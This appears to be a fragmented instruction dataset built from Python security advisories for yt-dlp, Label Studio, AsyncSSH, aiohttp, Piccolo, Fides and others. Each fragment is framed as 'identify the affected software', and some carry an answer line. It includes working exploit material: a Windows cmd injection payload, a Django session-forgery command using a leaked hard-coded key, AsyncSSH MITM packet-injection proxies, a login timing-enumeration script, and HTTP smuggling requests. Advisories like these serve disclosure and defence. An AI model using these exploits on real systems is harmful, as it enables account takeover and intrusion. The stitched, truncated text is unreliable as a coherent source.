These matched files should be contained within the project root directory, but that is not checked. This could result in changes being written to files outside of the project.\n\nThe default behaviour of `hyper-bump-it` is to display the planned changes and prompt the user for confirmation before editing any files.

The line setting  `show_confirm_prompt` to `false` is not required, but will result in the user file edits to occur without the user having a chance to reject the changes (The fact that changes happened would still be displayed). \n\n```toml\n[hyper-bump-it]\ncurrent_version = \"1.2.3\"\nshow_confirm_prompt=false\n\n[[hyper-bump-it.files]]\nfile_glob = \"../*\"\nsearch_format_pattern = \"hello\"\nreplace_format_pattern = \"world\"\n```\n\n### Patches\nA fix that been released as part of v0.5.1.

Input: ### Impact\n[`yt-dlp`](https://github.com/yt-dlp/yt-dlp) allows the user to provide shell commands to be executed at various stages in its download process through the `--exec` flag. This flag allows output template expansion in its argument, so that video metadata values may be used in the shell commands. The metadata fields can be combined with the `%q` conversion, which is intended to quote/escape these values so they can be safely passed to the shell.\n\nHowever, the escaping used for `cmd` (the shell used by Python's `subprocess` on Windows) did not properly escape special characters, which can allow for remote code execution if `--exec` is used directly with maliciously crafted remote data. This vulnerability only impacts `yt-dlp` on Windows, and the vulnerability is present regardless of whether `yt-dlp` is run from `cmd` or from `PowerShell`.\n\nSupport for output template expansion in `--exec`, along with this vulnerable behavior, was added to `yt-dlp` in version [2021.04.11](https://github.com/yt-dlp/yt-dlp/releases/tag/2021.04.11).\n\n```shell\n> yt-dlp https://youtu.be/Jo66yyCpHcQ --exec \"echo %(title)q\"\n[youtube] Extracting URL: https://youtu.be/Jo66yyCpHcQ\n[youtube] Jo66yyCpHcQ: Downloading webpage\n[youtube] Jo66yyCpHcQ: Downloading ios player API JSON\n[youtube] Jo66yyCpHcQ: Downloading android player API JSON\n[youtube] Jo66yyCpHcQ: Downloading m3u8 information\n[info] Jo66yyCpHcQ: Downloading 1 format(s): 135+251\n[download] Destination: \uff02&echo(&echo(pwned&rem( [Jo66yyCpHcQ].f135.mp4\n[download] 100% of    4.85KiB in 00:00:00 at 60.20KiB/s\n[download] Destination: \uff02&echo(&echo(pwned&rem( [Jo66yyCpHcQ].f251.webm\n[download] 100% of    4.80KiB in 00:00:00 at 31.58KiB/s\n[Merger] Merging formats into \"\uff02&echo(&echo(pwned&rem( [Jo66yyCpHcQ].mkv\"\nDeleting original file \uff02&echo(&echo(pwned&rem( [Jo66yyCpHcQ].f135.mp4 (pass -k to keep)\nDeleting original file \uff02&echo(&echo(pwned&rem( [Jo66yyCpHcQ].f251.webm (pass -k to keep)\n[Exec] Executing command: echo \"\\\"&echo(&echo(pwned&rem(\"\n\"\\\"\n\npwned\n```\n\n### Patches\nyt-dlp version 2023.09.24 fixes this issue by properly escaping each special character.\n`\\n` will be replaced by `\\r`, as no way of escaping it has been found.\n\n### Workarounds\nIt is recommended to upgrade yt-dlp to version 2023.09.24 as soon as possible. Also, always be careful when using `--exec`, because while this specific vulnerability has been patched, using unvalidated input in shell commands is inherently dangerous.\n\nFor Windows users who are not able to upgrade:\n- Avoid using any output template expansion in `--exec` other than `{}` (filepath).\n- If expansion in `--exec` is needed, verify the fields you are using do not contain `\"`, `|` or `&`.\n- Instead of using `--exec`, write the info json and load the fields from it instead.\n\n### References\n- https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-42h4-v29r-42qg\n- https://nvd.nist.gov/vuln/detail/CVE-2023-40581\n- https://github.com/yt-dlp/yt-dlp/releases/tag/2023.09.24\n- https://github.com/yt-dlp/yt-dlp-nightly-builds/releases/tag/2023.09.24.003044\n- https://github.com/yt-dlp/yt-dlp/commit/de015e930747165dbb8fcd360f8775fd973b7d6e.

Input: ### Impact\n\nA security issue was found in the Keylime `registrar` code which allows an attacker to effectively bypass the challenge-response protocol used to verify that an `agent` has indeed access to an AIK which in indeed related to the EK.\n\nWhen an `agent` starts up, it will contact a `registrar` and provide a public EK and public AIK, in addition to the EK Certificate. This `registrar` will then challenge the `agent` to decrypt a challenge encrypted with the EK. \n\nWhen receiving the wrong \"auth_tag\" back from the `agent` during activation, the `registrar` answers with an error message that contains the expected correct \"auth_tag\" (an HMAC which is calculated within the `registrar` for checking). An attacker could simply record the correct expected \"auth_tag\" from the HTTP error message and perform the activate call again with the correct expected \"auth_tag\" for the `agent`.\n\nThe security issue allows an attacker to pass the challenge-response protocol during registration with (almost) arbitrary registration data. In particular, the attacker can provide a valid EK Certificate and EK, which passes verification by the `tenant` (or `registrar`), while using a compromised AIK, which is stored unprotected outside the TPM and is unrelated to former two. The attacker then deliberately fails the initial activation call to get to know the correct \"auth_tag\" and then provides it in a subsequent activation call. This results in an `agent` which is (incorrectly) registered with a valid EK Certificate, but with a compromised/unrelated AIK.\n\n### Patches\nUsers should upgrade to release 7.5.0.

Please identify the software name affected by it. Input: ### Summary\n_Short summary of the problem. Make the impact and severity as clear as possible. For example: An unsafe deserialization vulnerability allows any unauthenticated user to execute arbitrary code on the server._\n\nThe current implementation of `BaseUser.login` leaks enough information to a malicious user such that they would be able to successfully generate a list of valid users on the platform. As Piccolo on it's own does not also enforce strong passwords (see [here](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html#implement-proper-password-strength-controls)), these lists of valid accounts are likely to be used in a password spray attack with the outcome being attempted takeover of user accounts on the platform.\n\nThe impact of this vulnerability is minor as it requires chaining with other attack vectors in order to gain more then simply a list of valid users on the underlying platform.\nThe likelihood of this vulnerability is possible as it requires minimal skills to pull off especially given the underlying login functionality for Piccolo based sites is open source.\n\n### Details\n_Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._\n\nThis vulnerability relates to [this](https://github.com/piccolo-orm/piccolo/blob/master/piccolo/apps/user/tables.py#L191-L237) code. Specifically the fact that responses are not returned in constant time, but rather are based off the internal state.\n\nFor example, if a user does not exist then `None` is returned immediately instead of encountering a time expensive hash comparison (Line 225). This discrepancy allows a malicious user to time requests made in order to generate a list of usernames which are valid on the underlying platform for usage in further attacks.\n\nIf your curious for some more information regarding this attack avenue, I wrote a blog post awhile back with a similar chain to this with some other types of analysis. It lives [here](https://skelmis.co.nz/posts/tbue/). \n\n### PoC\n_Complete instructions, including specific configuration details, to reproduce the vulnerability._\n#### Piccolo Setup\n1. In a fresh environment `pip install 'piccolo[all]'` and `piccolo asgi new`\n2. For simplified testing purposes, in `piccolo_conf.py` modify Piccolo to use SQLite:\n```python\nfrom piccolo.engine.sqlite import SQLiteEngine\nDB = SQLiteEngine()\n```\n3. In the same file, add the required apps for session authentication. The file should look like the following:\n```python\nfrom piccolo.engine.sqlite import SQLiteEngine\nfrom piccolo.conf.apps import AppRegistry\n\n\nDB = SQLiteEngine()\n\nAPP_REGISTRY = AppRegistry(\n    apps=[\n        \"home.piccolo_app\",\n        \"piccolo_admin.piccolo_app\",\n        \"piccolo_api.session_auth.piccolo_app\",\n        \"piccolo.apps.user.piccolo_app\",\n    ]\n)\n```\n4. Run the following migrations:\n```text\npiccolo migrations forwards user\npiccolo migrations forwards session_auth\n```\n5. Within `app.py`, mount `session_login` at the `/login` path as follows:\n```python\nfrom piccolo_api.session_auth.endpoints import session_login\napp.mount(\"/login\", session_login())\n```\n6. Create a new user using `piccolo user create`, making a note of the username and password for later steps.\n\n#### Exploitation\nThe following Python script can be used to reproduce this issue. It could also be expanded to easily take in user lists to conduct user enumeration at scale, however, that is outside the scope of this report.\n\n```python\nimport asyncio\nimport time\nfrom collections import defaultdict\n\nimport httpx\n\nnumber_of_attempts = 50\n# Set this to the username from step 6.\nvalid_username = \"skelmis\"\ninvalid_username = \"invalid\"\ndata = defaultdict(lambda: [])\n# Ensure this points to your current enviroment\nlocal_base_url = \"http://127.0.0.1:8000\"\n# Set this to the password from step 6.\nvalid_password = \"disobey-blunt-kindly-postbox-tarantula\"\ninvalid_password = \"cabana-polar-secrecy-neurology-pacific\"\n\n\nasync def make_request(username, password, session: httpx.AsyncClient):\n    start_time = time.time()\n    resp = await session.post(\n        f\"{local_base_url}/login\",\n        json={\"username\": username, \"password\": password},\n        follow_redirects=True,\n    )\n    end_time = time.time()\n    if username == valid_username and password == valid_password:\n        # Just sanity check expected passes are passing\n        assert resp.status_code == 200\n\n    resultant_time = end_time - start_time\n    data[f\"{username}|{password}\"].append(resultant_time)\n\n\nasync def main():\n    async with httpx.AsyncClient() as client:\n        # This is the baseline correct request\n        for _ in range(number_of_attempts):\n            await make_request(valid_username, valid_password, client)\n            await asyncio.sleep(0.1)\n\n        # This is for a valid user but invalid password\n        for _ in range(number_of_attempts):\n            await make_request(valid_username, invalid_password, client)\n            await asyncio.sleep(0.1)\n\n        # This is for an invalid user and password\n        for _ in range(number_of_attempts):\n            await make_request(invalid_username, invalid_password, client)\n            await asyncio.sleep(0.1)\n\n        r_1 = data[f\"{valid_username}|{valid_password}\"]\n        r_2 = data[f\"{valid_username}|{invalid_password}\"]\n        r_3 = data[f\"{invalid_username}|{invalid_password}\"]\n\n        r_1_sum = sum(r_1) / len(r_1)\n        r_2_sum = sum(r_2) / len(r_2)\n        r_3_sum = sum(r_3) / len(r_3)\n\n        print(\n            f\"Average time to response as a valid user with a valid password: {r_1_sum}\"\n        )\n        print(\n            f\"Average time to response as a valid user with an invalid password: {r_2_sum}\"\n        )\n        print(\n            f\"Average time to response as an invalid user with an invalid password: {r_3_sum}\"\n        )\n\n\nif __name__ == \"__main__\":\n    asyncio.run(main())\n```\n\nN.B. This script makes 50 requests per username/password combination in order to be more certain of the time to response for each combination\n\n\n#### Analysis\n\nThe following is the output from the PoC against `pip install piccolo`\n![Screenshot from 2023-09-08 18-36-45](https://user-images.githubusercontent.com/47520067/266522913-b8a0f499-e38b-47fd-a97d-292900320a01.png)\n\nThe following is the output from the PoC against `pip install git+https://github.com/piccolo-orm/piccolo.git`.\n![Screenshot from 2023-09-08 17-51-16](https://user-images.githubusercontent.com/47520067/266514350-82384ce6-c24f-4b89-8516-ec08282053e1.png)\n\nI have included the results from both versions to highlight that this issue is not as a result of [this](https://github.com/piccolo-orm/piccolo/pull/881) pull request but as a result of the underlying logic in usage.\n\nBoth of these runs clearly show a noticeable difference in the time to response for valid and invalid users which would allow a malicious user to build up a list of users for usage in further attacks against the website. For example, after building up a user list a malicious user may then conduct a [password spray attack](https://owasp.org/www-community/attacks/Password_Spraying_Attack) using common passwords in order to takeover user accounts on the platform.\n\n### Impact\n_What kind of vulnerability is it?

Input: # Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam.

Input: ### Impact\nThe Generic Extractor in yt-dlp is vulnerable to an attacker setting an arbitrary proxy for a request to an arbitrary url, allowing the attacker to MITM the request made from yt-dlp's HTTP session. This could lead to cookie exfiltration in some cases.\n\n<details>\n\nTo pass extra control data between extractors (such as headers like `Referer`), yt-dlp employs a concept of \"url smuggling\". This works by adding this extra data as json to the url fragment (\"smuggling\") that is then passed on to an extractor. The receiving extractor then \"unsmuggles\" the data from the input url. This functionality is intended to be internal only.\n\nCurrently, the Generic extractor supports receiving an arbitrary dictionary of HTTP headers in a smuggled url, of which it extracts and adds them to the initial request it makes to such url. This is useful when a url sent to the Generic extractor needs a `Referer` header sent with it, for example.\n\nAdditionally, yt-dlp has internal headers to set a proxy for a request: `Ytdl-request-proxy` and `Ytdl-socks-proxy`. While these are deprecated, internally `Ytdl-request-proxy` is still used for `--geo-verification-proxy`.\n\nHowever, it is possible for a maliciously crafted site include these smuggled options in a url which then the Generic extractor extracts and redirects to itself.  This allows a malicious website to **set an arbitrary proxy for an arbitrary url that the Generic extractor will request.**\n\nThis could allow for the following, but not limited too:\n- An attacker can MITM a request it asks yt-dlp to make to **any** website.\n   - If a user has loaded cookies into yt-dlp for the target site, which are not marked as [secure](https://en.wikipedia.org/wiki/Secure_cookie), they could be exfiltrated by the attacker.\n   - Fortunately most sites are HTTPS and should be setting cookies as secure.\n- An attacker can set cookies for an arbitrary site.\n\nAn example malicious webpage:\n```html\n<!DOCTYPE html>\n<cinerama.embedPlayer('t','{{ target_site }}#__youtubedl_smuggle=%7B%22http_headers%22:%7B%22Ytdl-request-proxy%22:%22{{ proxy url }}%22%7D,%22fake%22:%22.smil/manifest%22%7D')\n```\n\nWhere `{{ target_site }}` is the URL Generic extractor will request and `{{ proxy url }}` is the proxy to proxy the request for this url through.\n\n</details>\n\n### Patches\n- We have removed the ability to smuggle `http_headers` to the Generic extractor, as well as other extractors that use the same pattern.\n\n### Workarounds\n- Disable Generic extractor (`--ies default,-generic`), or only pass trusted sites with trusted content.\n- Take caution when using `--no-check-certificate`.\n\n### References\n- <https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-3ch3-jhc6-5r8x>\n- <https://nvd.nist.gov/vuln/detail/CVE-2023-46121>\n- <https://github.com/yt-dlp/yt-dlp/releases/tag/2023.11.14>\n- <https://github.com/yt-dlp/yt-dlp/commit/f04b5bedad7b281bee9814686bba1762bae092eb>\n.

Please identify the software name affected by it. Input: ### Impact\n\nAiohttp has a security vulnerability regarding the inconsistent interpretation of the http protocol. As we know that HTTP/1.1 is persistent, if we have both Content-Length(CL) and Transfer-Encoding(TE) it can lead to incorrect interpretation of two entities that parse the HTTP and we can poison other sockets with this incorrect interpretation.\n\nA possible Proof-of-Concept (POC) would be a configuration with a reverse proxy(frontend) that accepts both CL and TE headers and aiohttp as backend. As aiohttp parses anything with chunked, we can pass a chunked123 as TE, the frontend entity will ignore this header and will parse Content-Length. I can give a Dockerfile with the configuration if you want.\n\nThe impact of this vulnerability is that it is possible to bypass any proxy rule, poisoning sockets to other users like passing Authentication Headers, also if it is present an Open Redirect (just like CVE-2021-21330) we can combine it to redirect random users to our website and log the request.\n\n\n### References\n\n- https://github.com/aio-libs/aiohttp/commit/f016f0680e4ace6742b03a70cb0382ce86abe371.

Input: ### Summary\n\nAn issue in AsyncSSH v2.14.0 and earlier allows attackers to control the extension info message (RFC 8308) via a man-in-the-middle attack.\n\n### Details\n\nThe rogue extension negotiation attack targets an AsyncSSH client connecting to any SSH server sending an extension info message. The attack exploits an implementation flaw in the AsyncSSH implementation to inject an extension info message chosen by the attacker and delete the original extension info message, effectively replacing it.\n\nA correct SSH implementation should not process an unauthenticated extension info message. However, the injected message is accepted due to flaws in AsyncSSH. AsyncSSH supports the server-sig-algs and global-requests-ok extensions. Hence, the attacker can downgrade the algorithm used for client authentication by meddling with the value of server-sig-algs (e.g. use of SHA-1 instead of SHA-2).\n\n### PoC\n\n<details>\n    <summary>AsyncSSH Client 2.14.0 (simple_client.py example) connecting to AsyncSSH Server 2.14.0 (simple_server.py example)</summary>\n\n   ```python\n    #!/usr/bin/python3\n    import socket\n    from threading import Thread\n    from binascii import unhexlify\n    \n    #####################################################################################\n    ## Proof of Concept for the rogue extension negotiation attack (ChaCha20-Poly1305) ##\n    ##                                                                                 ##\n    ## Client(s) tested: AsyncSSH 2.14.0 (simple_client.py example)                    ##\n    ## Server(s) tested: AsyncSSH 2.14.0 (simple_server.py example)                    ##\n    ##                                                                                 ##\n    ## Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0    ##\n    #####################################################################################\n    \n    # IP and port for the TCP proxy to bind to\n    PROXY_IP = '127.0.0.1'\n    PROXY_PORT = 2222\n    \n    # IP and port of the server\n    SERVER_IP = '127.0.0.1'\n    SERVER_PORT = 22\n    \n    # Length of the individual messages\n    NEW_KEYS_LENGTH = 16\n    SERVER_EXT_INFO_LENGTH = 676\n    \n    newkeys_payload = b'\\x00\\x00\\x00\\x0c\\x0a\\x15'\n    def contains_newkeys(data):\n        return newkeys_payload in data\n    \n    # Empty EXT_INFO here to keep things simple, but may also contain actual extensions like server-sig-algs\n    rogue_ext_info = unhexlify('0000000C060700000000000000000000')\n    def insert_rogue_ext_info(data):\n        newkeys_index = data.index(newkeys_payload)\n        # Insert rogue extension info and remove SSH_MSG_EXT_INFO\n        return data[:newkeys_index] + rogue_ext_info + data[newkeys_index:newkeys_index + NEW_KEYS_LENGTH] + data[newkeys_index + NEW_KEYS_LENGTH + SERVER_EXT_INFO_LENGTH:]\n    \n    def forward_client_to_server(client_socket, server_socket):\n        try:\n            while True:\n                client_data = client_socket.recv(4096)\n                if len(client_data) == 0:\n                    break\n                server_socket.send(client_data)\n        except ConnectionResetError:\n            print(\"[!] Client connection has been reset.

Because the `int` constructor accepts `+` and `-` prefixes, and digit-separating underscores, using `int` to parse CL values leads AIOHTTP to significant misinterpretation.\n\n### Examples\n```\nGET / HTTP/1.1\\r\\n\nContent-Length: -0\\r\\n\n\\r\\n\nX\n```\n```\nGET / HTTP/1.1\\r\\n\nContent-Length: +0_1\\r\\n\n\\r\\n\nX\n```\n\n### Suggested action\nVerify that a `Content-Length` value consists only of ASCII digits before parsing, as the standard requires.\n\n## Bug 2: Improper handling of NUL, CR, and LF in header values\n\n### Description\nRFC 9110 says this:\n> Field values containing CR, LF, or NUL characters are invalid and dangerous, due to the varying ways that implementations might parse and interpret those characters; a recipient of CR, LF, or NUL within a field value MUST either reject the message or replace each of those characters with SP before further processing or forwarding of that message.\n\nAIOHTTP's HTTP parser does not enforce this rule, and will happily process header values containing these three forbidden characters without replacing them with SP.\n### Examples\n```\nGET / HTTP/1.1\\r\\n\nHeader: v\\x00alue\\r\\n\n\\r\\n\n```\n```\nGET / HTTP/1.1\\r\\n\nHeader: v\\ralue\\r\\n\n\\r\\n\n```\n```\nGET / HTTP/1.1\\r\\n\nHeader: v\\nalue\\r\\n\n\\r\\n\n```\n### Suggested action\nReject all messages with NUL, CR, or LF in a header value. The translation to space thing, while technically allowed, does not seem like a good idea to me.\n\n## Bug 3: Improper stripping of whitespace before colon in HTTP headers\n\n### Description\nRFC 9112 says this:\n> No whitespace is allowed between the field name and colon. In the past, differences in the handling of such whitespace have led to security vulnerabilities in request routing and response handling. A server MUST reject, with a response status code of 400 (Bad Request), any received request message that contains whitespace between a header field name and colon.\n\nAIOHTTP does not enforce this rule, and will simply strip any whitespace before the colon in an HTTP header.\n\n### Example\n```\nGET / HTTP/1.1\\r\\n\nContent-Length : 1\\r\\n\n\\r\\n\nX\n```\n\n### Suggested action\nReject all messages with whitespace before a colon in a header field, as the standard requires.\n\n# PoC\nExample requests are embedded in the previous section.

Please identify the software name affected by it. Input: ### Summary\n\nAn issue in AsyncSSH v2.14.0 and earlier allows attackers to control the remote end of an SSH client session via packet injection/removal and shell emulation.\n\n### Details\n\nThe rogue session attack targets any SSH client connecting to an AsyncSSH server, on which the attacker must have a shell account. The goal of the attack is to log the client into the attacker's account without the client being able to detect this. At that point, due to how SSH sessions interact with shell environments, the attacker has complete control over the remote end of the SSH session. The attacker receives all keyboard input by the user, completely controls the terminal output of the user's session, can send and receive data to/from forwarded network ports, and is able to create signatures with a forwarded SSH Agent, if any. The result is a complete break of the confidentiality and integrity of the secure channel, providing a strong vector for a targeted phishing campaign against the user. For example, the attacker can display a password prompt and wait for the user to enter the password, elevating the attacker's position to a MitM at the application layer and enabling perfect shell emulation.\n\nThe attacks work by the attacker injecting a chosen authentication request before the client's NewKeys. The authentication request sent by the attacker must be a valid authentication request containing his credentials. The attacker can use any authentication mechanism that does not require exchanging additional messages between client and server, such as password or publickey. Due to a state machine flaw, the AsyncSSH server accepts the unauthenticated user authentication request message and defers it until the client has requested the authentication protocol.\n\n### PoC\n\n<details>\n  <summary>AsyncSSH 2.14.0 client (simple_client.py example) connecting to AsyncSSH 2.14.0 server (simple_server.py example)</summary>\n\n  ```python\n  #!/usr/bin/python3\n  import socket\n  from threading import Thread\n  from binascii import unhexlify\n  from time import sleep\n  \n  ##################################################################################\n  ## Proof of Concept for the rogue session attack (ChaCha20-Poly1305)            ##\n  ##                                                                              ##\n  ## Variant: Unmodified variant (EXT_INFO by client required)                    ##\n  ##                                                                              ##\n  ## Client(s) tested: AsyncSSH 2.14.0 (simple_client.py example)                 ##\n  ## Server(s) tested: AsyncSSH 2.14.0 (simple_server.py example)                 ##\n  ##                                                                              ##\n  ## Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0 ##\n  ##################################################################################\n  \n  # IP and port for the TCP proxy to bind to\n  PROXY_IP = '127.0.0.1'\n  PROXY_PORT = 2222\n  \n  # IP and port of the server\n  SERVER_IP = '127.0.0.1'\n  SERVER_PORT = 22\n  \n  # Length of the individual messages\n  NEW_KEYS_LENGTH = 16\n  CLIENT_EXT_INFO_LENGTH = 60\n  # Additional data sent by the client after NEW_KEYS (excluding EXT_INFO)\n  ADDITIONAL_CLIENT_DATA_LENGTH = 60\n  \n  newkeys_payload = b'\\x00\\x00\\x00\\x0c\\x0a\\x15'\n  def contains_newkeys(data):\n      return newkeys_payload in data\n  \n  rogue_userauth_request = unhexlify('000000440b320000000861747461636b65720000000e7373682d636f6e6e656374696f6e0000000870617373776f7264000000000861747461636b65720000000000000000000000')\n  def insert_rogue_authentication_request(data):\n      newkeys_index = data.index(newkeys_payload)\n      # Insert rogue authentication request and remove SSH_MSG_EXT_INFO\n      return data[:newkeys_index] + rogue_userauth_request + data[newkeys_index:newkeys_index + NEW_KEYS_LENGTH] + data[newkeys_index + NEW_KEYS_LENGTH + CLIENT_EXT_INFO_LENGTH:]\n  \n  def forward_client_to_server(client_socket, server_socket):\n      delay_next = False\n      try:\n          while True:\n              client_data = client_socket.recv(4096)\n              if delay_next:\n                  delay_next = False\n                  sleep(0.25)\n              if contains_newkeys(client_data):\n                  print(\"[+] SSH_MSG_NEWKEYS sent by client identified!\")\n                  if len(client_data) < NEW_KEYS_LENGTH + CLIENT_EXT_INFO_LENGTH + ADDITIONAL_CLIENT_DATA_LENGTH:\n                      print(\"[+] client_data does not contain all messages sent by the client yet.

In the worst case, the AsyncSSH server starts a shell for the authenticated user upon connection, switching the user to the authenticated one. In this case, the attacker can prepare a modified shell beforehand to perform perfect phishing attacks and become a MitM at the application layer. When the username of the authenticated user is not used beyond authentication, this vulnerability does not impact the connection's security.\n. Top 1 search result is pypi:asyncssh.

Input: ### Impact\n\nThe Fides Privacy Center allows data subject users to submit privacy and consent requests to data controller users of the Fides web application.\n\nPrivacy requests allow data subjects to submit a request to access all person data held by the data controller, or delete/erase it.  Consent request allows data subject users to modify their privacy preferences for how the data controller uses their personal data e.g. data sales and sharing consent opt-in/opt-out.\n\nIf `subject_identity_verification_required` in the `[execution]` section of `fides.toml` or the env var `FIDES__EXECUTION__SUBJECT_IDENTITY_VERIFICATION_REQUIRED` is set to `True` on the fides webserver backend, data subjects are sent a one-time code to their email address or phone number, depending on messaging configuration, and the one-time code must be entered in the Privacy Center UI by the data subject before the privacy or consent request is submitted.\n\nIt was identified that the one-time code values for these requests were generated by the python `random` module, a cryptographically weak pseduo-random number generator (PNRG). If an attacker generates several hundred consecutive one-time codes, this vulnerability allows the attacker to predict all future one-time code values during the lifetime of the backend python process.\n\nThere is no security impact on data access requests as the personal data download package is not shared in the Privacy Center itself. However, this vulnerability allows an attacker to (i) submit a verified data erasure request, resulting in deletion of data for the targeted user and (ii) submit a verified consent request, modifying a user's privacy preferences.\n\n### Patches\nThe vulnerability has been patched in Fides version `2.24.0`.

If the request is approved by the data controller user operating the Fides web application, the data subject's personal data can then retrieved from connected systems and data stores before being bundled together as a data subject access request package for the data subject to download. Supported data formats for the package include json and csv, but the most commonly used format is a series of HTML files compressed in a ZIP file. Once downloaded and unzipped, the data subject user can browse the HTML files on their local machine.\n\nIt was identified that there was no validation of input coming from e.g. the connected systems and data stores which is later reflected in the downloaded data. This can result in an HTML injection that can be abused e.g. for phishing attacks or malicious JavaScript code execution, but only in the context of the data subject's browser accessing a HTML page using the `file://` protocol.\n\nExploitation is limited to rogue Admin UI users, malicious connected system / data store users, and the data subject user if tricked via social engineering into submitting malicious data themselves.\n\n### Patches\nThe vulnerability has been patched in Fides version `TBC`.

An application is vulnerable if it reads Arrow IPC, Feather or Parquet data from untrusted sources (for example user-supplied input files). This vulnerability only affects PyArrow, not other Apache Arrow implementations or bindings.\n\nNote that Ibis itself makes **extremely limited** use of `pyarrow.parquet.read_table`:\n\n1. `read_table` is used in tests, where the input file is entirely controlled by the Ibis developers\n2. `read_table` is used in the `ibis/examples/__init__.py` as a fallback for backends that don't support reading Parquet directly. Parquet data used in `ibis.examples` are also managed by the Ibis developers. This Parquet data is generated from CSV files and SQLite databases.\n3. The Pandas and Dask backends both use PyArrow to read Parquet files and are therefore affected.\n\nIbis **does not** make use of APIs that directly read from either Arrow IPC files or Feather files.\n\n### Patches\n\nIbis imports the `pyarrow_hotfix` package wherever pyarrow is used, as of version 7.1.0.\n\nUpgrading to Arrow 14.0.1 is also a possible solution, starting in Ibis 7.1.0.\n\n### Workarounds\n\nInstall [`pyarrow_hotfix`](https://pypi.org/project/pyarrow-hotfix/) and run `import pyarrow_hotfix` ahead of any and all `import ibis` statements.\n\nFor example:\n\n```python\nimport ibis\n```\n\nbecomes\n\n```python\nimport pyarrow_hotfix\nimport ibis\n```\n\n### References\n\nhttps://www.cve.org/CVERecord?id=CVE-2023-47248\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-47248.

